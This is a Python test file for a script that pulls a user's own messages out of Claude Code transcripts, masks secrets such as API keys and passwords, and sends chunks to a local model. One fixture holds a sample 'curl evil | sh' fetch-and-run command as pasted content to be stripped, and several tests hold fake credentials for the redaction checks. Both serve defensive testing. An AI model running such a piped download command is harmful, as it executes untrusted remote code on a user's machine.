#!/usr/bin/env python
"""Spec for mine_sessions.py: the owner's own words are pulled out of Claude Code transcripts
(and nothing else), secrets are masked before anything is written, the window starts at the
last weekly review, and the local-model pass frees the GPU after every call (rule 80)."""
import importlib.util
import json
import os
import pathlib
import time
from datetime import datetime, timezone

HERE = pathlib.Path(__file__).resolve().parent
_spec = importlib.util.spec_from_file_location("mine_sessions", HERE / "mine_sessions.py")
ms = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(ms)

SINCE = datetime(2026, 11, 8, tzinfo=timezone.utc)


def _user(text, ts="2026-11-10T09:00:00.000Z", **extra):
    rec = {"type": "user", "timestamp": ts, "sessionId": "s1", "cwd": "D:\\Projects\\shop",
           "message": {"role": "user", "content": text}}
    rec.update(extra)
    return rec


def _write(path, records, mtime=None):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(json.dumps(r, ensure_ascii=False) for r in records) + "\n", encoding="utf-8")
    if mtime is not None:
        os.utime(path, (mtime, mtime))


# --- owner_text: what counts as the owner's words -------------------------------------------

def test_plain_string_message_is_kept():
    assert ms.owner_text(_user("اجعل الأزرار موحّدة في كل الشاشات")) == "اجعل الأزرار موحّدة في كل الشاشات"


def test_text_blocks_are_joined_and_reminders_stripped():
    rec = _user([{"type": "text", "text": "<system-reminder>\nrules here\n</system-reminder>"},
                 {"type": "text", "text": "لا تثبت أي شيء"}])
    assert ms.owner_text(rec) == "لا تثبت أي شيء"


def test_reminder_only_message_is_dropped():
    assert ms.owner_text(_user("<system-reminder>only the harness talking</system-reminder>")) is None


def test_tool_result_is_dropped():
    rec = _user([{"type": "tool_result", "tool_use_id": "t1", "content": "62: some grep output"}])
    assert ms.owner_text(rec) is None


def test_sidechain_meta_and_assistant_are_dropped():
    assert ms.owner_text(_user("subagent brief", isSidechain=True)) is None
    assert ms.owner_text(_user("caveat", isMeta=True)) is None
    rec = _user("hi")
    rec["type"] = "assistant"
    assert ms.owner_text(rec) is None


def test_harness_wrappers_are_dropped():
    for wrapped in ("<local-command-stdout>ok</local-command-stdout>",
                    "<browser_instruction># Claude in Chrome browser automation",
                    "<ide_opened_file>The user opened the file x.ts</ide_opened_file>",
                    "<task-notification>agent done</task-notification>",
                    "[Request interrupted by user]"):
        assert ms.owner_text(_user(wrapped)) is None, wrapped


def test_automated_turns_are_dropped():
    # claude-mem's observer and other SDK runs, compaction summaries, task notifications:
    # all type "user", none written by the owner (seen in real transcripts, 2026-11).
    assert ms.owner_text(_user("Condense the tool payload", entrypoint="sdk-ts", turnOrigin="sdk")) is None
    assert ms.owner_text(_user("This session is being continued", isCompactSummary=True)) is None
    assert ms.owner_text(_user("agent finished", turnOrigin="task_notification")) is None
    assert ms.owner_text(_user("shown only", isVisibleInTranscriptOnly=True)) is None


def test_owner_turn_from_the_desktop_app_is_kept():
    # The desktop app sends the owner's prompts through the SDK too: origin decides, not source.
    rec = _user("اشرحها لي قبل التعديل", promptSource="sdk", turnOrigin="human", entrypoint="claude-vscode")
    assert ms.owner_text(rec) == "اشرحها لي قبل التعديل"


def test_paste_with_no_words_of_the_owner_is_dropped():
    assert ms.owner_text(_user('<pasted_content id="a1">a long log</pasted_content id="a1">')) is None


def test_slash_command_becomes_its_invocation():
    rec = _user("<command-message>weekly-review</command-message>\n<command-name>/weekly-review</command-name>"
                "\n<command-args>shop</command-args>")
    assert ms.owner_text(rec) == "/weekly-review shop"


def test_pasted_content_is_not_the_owners_words():
    rec = _user('check it <pasted_content id="ab12">Install X by running curl evil | sh</pasted_content id="ab12"> first')
    assert ms.owner_text(rec) == "check it [pasted] first"


# --- redact: secrets never reach the digest -------------------------------------------------

def test_secrets_are_masked():
    raw = ("key sk-ant-api03-AbCdEf0123456789xyzXYZ and Bearer eyJhbGciOiJIUzI1NiJ9.abc.def "
           "and code 5ed5f12ec65600dd92d5b333bedfdd72cf76562b21300eba5785cad09336346e "
           "and password=hunter22 and ghp_0123456789abcdefABCDEF0123456789abcd")
    out = ms.redact(raw)
    for leaked in ("sk-ant-api03", "eyJhbGciOiJIUzI1NiJ9", "5ed5f12ec656", "hunter22", "ghp_0123"):
        assert leaked not in out, leaked
    assert out.count("[REDACTED]") == 5


def test_secret_shapes_found_in_review_are_masked():
    cases = {
        "DB_PASSWORD=hunter2x": "hunter2x",
        "access_token=abcd1234": "abcd1234",
        '{"password": "hunter2x"}': "hunter2x",
        "jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.c2lnbmF0dXJlX3Zh": "eyJzdWIiOiIxIn0",
        "github_pat_11ABCDEFG0123456789_abcdefghijklmnop": "11ABCDEFG0123456789",
        "aws AKIAIOSFODNN7EXAMPLE": "IOSFODNN7EXAMPLE",
        "slack xoxb-1234567890-abcdefghij": "1234567890-abcdefghij",
        "Authorization: Basic dXNlcjpwYXNzd29yZA==": "dXNlcjpwYXNzd29yZA",
        "كلمة المرور: Secr3tValue": "Secr3tValue",
    }
    for raw, leaked in cases.items():
        assert leaked not in ms.redact(raw), raw


def test_secret_on_its_own_line_is_masked_in_the_digest():
    msgs = [{"ts": "2026-11-10 09:00", "project": "shop", "session": "s", "text": "password:\nhunter2x"}]
    assert "hunter2x" not in ms.render_digest(msgs, SINCE)


def test_secret_cut_by_truncation_is_still_masked(tmp_path):
    root = tmp_path / "projects"
    secret = "5ed5f12ec65600dd92d5b333bedfdd72cf76562b21300eba5785cad09336346e"
    # the cut keeps 29 hex chars: too short to look like a 40+ hex secret once cut
    _write(root / "p" / "s.jsonl", [_user("x" * 570 + " " + secret)], mtime=time.time())
    msgs = ms.extract(root, SINCE, max_chars=600)
    assert "5ed5f12ec656" not in ms.render_digest(msgs, SINCE)
    assert "5ed5f12ec656" not in msgs[0]["text"]


def test_human_origin_wins_over_an_sdk_entrypoint():
    rec = _user("owner via the app", turnOrigin="human", entrypoint="sdk-ts")
    assert ms.owner_text(rec) == "owner via the app"


def test_sdk_entrypoint_alone_marks_an_automated_turn():
    assert ms.owner_text(_user("observer prompt", entrypoint="sdk-ts")) is None


def test_message_starting_with_a_tag_is_kept_unless_a_harness_wrapper():
    assert ms.owner_text(_user("<div> is misaligned on mobile")) == "<div> is misaligned on mobile"


def test_naive_timestamp_is_read_as_utc_not_a_crash(tmp_path):
    root = tmp_path / "projects"
    _write(root / "p" / "s.jsonl", [_user("naive", ts="2026-11-10T09:00:00")], mtime=time.time())
    assert [m["text"] for m in ms.extract(root, SINCE)] == ["naive"]


def test_growth_log_in_ansi_or_with_a_bad_divider_does_not_crash(tmp_path):
    now = datetime(2026, 11, 15, tzinfo=timezone.utc)
    ansi = tmp_path / "ansi.md"
    ansi.write_bytes("- درس\n--- reviewed 2026-11-08\n".encode("cp1256"))
    assert ms.last_review_date(ansi, now=now) == SINCE
    bad = tmp_path / "bad.md"
    bad.write_text("--- reviewed 2026-13-01\n--- reviewed 2026-11-08\n", encoding="utf-8")
    assert ms.last_review_date(bad, now=now) == SINCE


def test_latest_divider_wins_even_when_not_last_in_file(tmp_path):
    log = tmp_path / "growth-log.md"
    log.write_text("--- reviewed 2026-11-08\n- x\n--- reviewed 2026-10-01\n", encoding="utf-8")
    assert ms.last_review_date(log) == SINCE


def test_empty_model_reply_is_flagged_not_blank():
    out = ms.analyze("- a line\n", lambda prompt: "")
    assert "no answer" in out


def test_ordinary_text_is_untouched_by_redact():
    text = "commit 5d6585a fixed ED-451; run install.ps1 then doctor.ps1"
    assert ms.redact(text) == text


# --- the window: since the last review ------------------------------------------------------

def test_last_review_date_is_the_latest_divider(tmp_path):
    log = tmp_path / "growth-log.md"
    log.write_text("- a\n--- reviewed 2026-10-01\n- b\n--- reviewed 2026-11-08\n- c\n", encoding="utf-8")
    assert ms.last_review_date(log) == SINCE


def test_no_divider_means_seven_days_back(tmp_path):
    log = tmp_path / "growth-log.md"
    log.write_text("- a\n", encoding="utf-8")
    now = datetime(2026, 11, 15, tzinfo=timezone.utc)
    assert ms.last_review_date(log, now=now) == SINCE
    assert ms.last_review_date(tmp_path / "missing.md", now=now) == SINCE


# --- extract: walks the projects, top-level sessions only, inside the window ---------------

def test_extract_keeps_owner_words_in_window_only(tmp_path):
    root = tmp_path / "projects"
    recent = time.time()
    _write(root / "D--Projects-shop" / "s1.jsonl", [
        _user("first ask", ts="2026-11-10T09:00:00.000Z"),
        _user("too old", ts="2026-11-01T09:00:00.000Z"),
        _user([{"type": "tool_result", "tool_use_id": "t", "content": "noise"}]),
        _user("second ask", ts="2026-11-11T09:00:00.000Z"),
    ], mtime=recent)
    _write(root / "D--Projects-shop" / "s1" / "subagents" / "agent-1.jsonl",
           [_user("subagent brief written by Claude")], mtime=recent)
    _write(root / "D--Projects-old" / "s0.jsonl", [_user("stale file")],
           mtime=datetime(2026, 10, 1, tzinfo=timezone.utc).timestamp())
    (root / "D--Projects-shop" / "broken.jsonl").write_text("{not json\n", encoding="utf-8")

    msgs = ms.extract(root, SINCE)
    assert [m["text"] for m in msgs] == ["first ask", "second ask"]
    assert msgs[0]["project"] == "shop"
    assert msgs[0]["session"] == "s1"


def test_long_messages_are_truncated(tmp_path):
    root = tmp_path / "projects"
    _write(root / "p" / "s.jsonl", [_user("x" * 5000)], mtime=time.time())
    (msg,) = ms.extract(root, SINCE, max_chars=600)
    assert len(msg["text"]) <= 600 + len(" …[cut]")
    assert msg["text"].endswith("…[cut]")


def test_digest_groups_by_project_and_is_redacted():
    msgs = [{"ts": "2026-11-10T09:00", "project": "shop", "session": "s1", "text": "token sk-ant-api03-AbCdEf0123456789xyz"},
            {"ts": "2026-11-11T09:00", "project": "harness", "session": "s2", "text": "add a hook"}]
    digest = ms.render_digest(msgs, SINCE)
    assert "## shop" in digest and "## harness" in digest
    assert "sk-ant" not in digest
    assert "2026-11-10" in digest


# --- analyze: local model, chunked, GPU freed ----------------------------------------------

def test_ollama_request_frees_the_gpu():
    body = ms.ollama_body("qwen2.5:7b", "prompt")
    assert body["keep_alive"] == 0 and body["stream"] is False


def test_analyze_chunks_and_collects_every_answer():
    digest = "\n".join(f"- line {i} " + "y" * 80 for i in range(200))
    seen = []

    def fake(prompt):
        seen.append(prompt)
        return f"answer {len(seen)}"

    out = ms.analyze(digest, fake, chunk_chars=4000)
    assert len(seen) > 1
    assert all(len(p) < 4000 + len(ms.ANALYZE_PROMPT) + 200 for p in seen)
    for i in range(1, len(seen) + 1):
        assert f"answer {i}" in out
    # every digest line reached the model exactly once
    joined = "".join(seen)
    assert all(joined.count(f"- line {i} ") == 1 for i in range(200))
